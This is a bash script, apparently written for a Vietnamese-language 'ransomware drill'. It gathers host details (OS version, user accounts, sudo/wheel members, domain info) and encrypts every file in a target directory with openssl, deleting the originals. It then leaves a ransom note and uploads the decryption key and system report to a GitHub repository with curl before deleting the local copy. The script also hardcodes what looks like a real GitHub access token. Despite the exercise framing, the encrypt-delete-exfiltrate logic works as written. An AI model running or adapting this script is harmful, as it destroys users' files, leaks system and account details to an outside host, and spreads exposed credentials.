#!/bin/bash

# Dừng script ngay khi có lệnh nào đó thất bại
set -e

# =================================================================
# PHẦN CẤU HÌNH - VUI LÒNG THAY ĐỔI CÁC GIÁ TRỊ DƯỚI ĐÂY
# =================================================================

# --- Cấu hình cho phần Mã hóa ---
TARGET_DIR="/home/namtn/ransomware"
RANSOM_NOTE="_FILES_ENCRYPTED_.txt"
EXTENSION=".drill"

# --- Cấu hình cho phần Upload lên GitHub ---
GITHUB_TOKEN="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" # THAY THẾ BẰNG TOKEN CỦA BẠN
GITHUB_OWNER="tsukiazuma"
GITHUB_REPO="dientap"
PATH_IN_REPO=""

# =================================================================
# KỊCH BẢN TỰ ĐỘNG - KHÔNG CẦN CHỈNH SỬA PHẦN DƯỚI NÀY
# =================================================================

# --- CÀI ĐẶT CHUNG VÀ KIỂM TRA ĐIỀU KIỆN ---
HOSTNAME_VAR=$(hostname)
OUTPUT_FILE="${TARGET_DIR}/${HOSTNAME_VAR}.txt"
FILENAME=$(basename "$OUTPUT_FILE")

echo "==================================================================="
echo "            KỊCH BẢN DIỄN TẬP RANSOMWARE (GỘP CHO LINUX/MACOS)"
echo "==================================================================="
# ... (Toàn bộ các phần 1 và 2 giữ nguyên như trước) ...

# ##################### PHẦN 1: THU THẬP THÔNG TIN HỆ THỐNG #####################
echo "[PHẦN 1] Bắt đầu thu thập thông tin hệ thống..."
# (Code phần 1 không thay đổi)
echo "THÔNG TIN HỆ THỐNG ($HOSTNAME_VAR)" > "$OUTPUT_FILE"
echo "Chạy vào lúc: $(date)" >> "$OUTPUT_FILE"
echo "==============================================" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"
echo "[1, 2, 3] THÔNG TIN HỆ ĐIỀU HÀNH, PHIÊN BẢN & BẢN VÁ" >> "$OUTPUT_FILE"
echo "---------------------------------------------------" >> "$OUTPUT_FILE"
if [ -f /etc/os-release ]; then cat /etc/os-release >> "$OUTPUT_FILE"; else uname -a >> "$OUTPUT_FILE"; fi
echo "" >> "$OUTPUT_FILE"
echo "[4] TÀI KHOẢN NGƯỜI DÙNG VÀ QUYỀN QUẢN TRỊ" >> "$OUTPUT_FILE"
echo "--------------------------------------------" >> "$OUTPUT_FILE"
echo "--- Tất cả tài khoản người dùng:" >> "$OUTPUT_FILE"
cut -d: -f1 /etc/passwd >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"
echo "--- Tài khoản có quyền Quản trị (sudo/wheel):" >> "$OUTPUT_FILE"
grep -E '^sudo|^wheel' /etc/group | sed 's/$/,/g' >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"
echo "[5] TÊN MÁY CHỦ (HOSTNAME) VÀ DOMAIN" >> "$OUTPUT_FILE"
echo "--------------------------------------" >> "$OUTPUT_FILE"
echo "Hostname: $HOSTNAME_VAR" >> "$OUTPUT_FILE"
echo -n "Domain Info (từ /etc/resolv.conf): " >> "$OUTPUT_FILE"
grep -E '^search|^domain' /etc/resolv.conf >> "$OUTPUT_FILE" || echo "Không có cấu hình" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"
echo "[HOÀN TẤT PHẦN 1] Đã thu thập xong thông tin hệ thống."
echo

# ##################### PHẦN 2: TẠO KEY VÀ MÃ HÓA DỮ LIỆU #####################
echo "[PHẦN 2] Bắt đầu quá trình mã hóa..."
check_file=$(find "$TARGET_DIR" -type f -name "*$EXTENSION" -print -quit)
if [ -n "$check_file" ]; then
    echo "[CẢNH BÁO] Đã tìm thấy file đã mã hóa. Bỏ qua bước mã hóa."
else
    echo "[INFO] Thư mục chưa bị mã hóa. Bắt đầu quá trình..."
    KEY=$(openssl rand -base64 32)
    echo "==============================================" >> "$OUTPUT_FILE"
    echo "" >> "$OUTPUT_FILE"
    echo "[KEY MÃ HÓA] - Hãy lưu key này cẩn thận để giải mã" >> "$OUTPUT_FILE"
    echo "---------------------------------------------------" >> "$OUTPUT_FILE"
    echo "$KEY" >> "$OUTPUT_FILE"
    echo "[INFO] Đã tạo key và lưu vào file: $OUTPUT_FILE"
    echo
    cd "$TARGET_DIR"
    find . -type f -not -name "$FILENAME" -not -name "$RANSOM_NOTE" -not -name "*$EXTENSION" -print0 | while IFS= read -r -d $'\0' file; do
        openssl enc -aes-256-cbc -salt -in "$file" -out "$file$EXTENSION" -pass pass:"$KEY" -pbkdf2 && rm "$file"
    done
    cat << EOF > "$RANSOM_NOTE"
@@@ CẢNH BÁO QUAN TRỌNG @@@
Tất cả các file quan trọng của bạn trong thư mục $TARGET_DIR đã bị MÃ HÓA.
Để khôi phục lại file, bạn cần key giải mã duy nhất.
Đây là một phần của DIỄN TẬP RANSOMWARE.
Vui lòng báo cáo sự cố này cho đội ngũ IT/Security của bạn ngay lập tức.
Key giải mã đã được lưu cùng thông tin hệ thống trong file: $FILENAME
EOF
    echo "[HOÀN TẤT PHẦN 2] Quá trình mã hóa đã hoàn thành."
fi
echo

# ##################### PHẦN 3: UPLOAD FILE KẾT QUẢ LÊN GITHUB #####################
# (Code phần 3 có thay đổi ở phần dọn dẹp cuối cùng)
echo "[PHẦN 3] Bắt đầu tải file kết quả lên GitHub..."
if [ ! -f "$OUTPUT_FILE" ]; then echo "[LỖI] Không tìm thấy file kết quả '$OUTPUT_FILE'." && exit 1; fi
FULL_PATH_IN_REPO="${PATH_IN_REPO}${FILENAME}"
API_URL="https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${FULL_PATH_IN_REPO}"
BASE64_CONTENT=$(base64 -w 0 "${OUTPUT_FILE}")
API_RESPONSE=$(curl -s -H "Authorization: Bearer ${GITHUB_TOKEN}" "${API_URL}" || true)
FILE_SHA=$(echo "${API_RESPONSE}" | jq -r '.sha // ""')
if [ -n "${FILE_SHA}" ]; then
    COMMIT_MESSAGE="Update ${FILENAME} via API"
    JSON_PAYLOAD=$(printf '{"message":"%s","content":"%s","sha":"%s"}' "$COMMIT_MESSAGE" "$BASE64_CONTENT" "$FILE_SHA")
else
    COMMIT_MESSAGE="Create ${FILENAME} via API"
    JSON_PAYLOAD=$(printf '{"message":"%s","content":"%s"}' "$COMMIT_MESSAGE" "$BASE64_CONTENT")
fi
RESPONSE_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X PUT -H "Accept: application/vnd.github+json" -H "Authorization: Bearer ${GITHUB_TOKEN}" -d "${JSON_PAYLOAD}" "${API_URL}")

# ################################## KẾT THÚC VÀ DỌN DẸP ##################################
echo
echo "================================================================="
if [[ ${RESPONSE_CODE} -eq 200 || ${RESPONSE_CODE} -eq 201 ]]; then
    echo "HOÀN THÀNH TOÀN BỘ KỊCH BẢN! (Status Code: ${RESPONSE_CODE})."
    echo "+ File đã được upload/cập nhật thành công lên GitHub."
    echo "+ Kiểm tra tại: https://github.com/${GITHUB_OWNER}/${GITHUB_REPO}/blob/main/${FULL_PATH_IN_REPO}"
    echo
    echo "[DỌN DẸP] Đang xóa file kết quả tại local..."
    rm -f "${OUTPUT_FILE}"
    echo "+ Đã xóa: ${OUTPUT_FILE}"
else
    echo "THẤT BẠI! Lỗi khi upload file (Status Code: ${RESPONSE_CODE})."
    echo "Vui lòng kiểm tra lại GITHUB_TOKEN, tên Owner/Repo và các quyền truy cập."
    echo "[QUAN TRỌNG] File kết quả vẫn được giữ lại tại: ${OUTPUT_FILE}"
fi
echo "================================================================="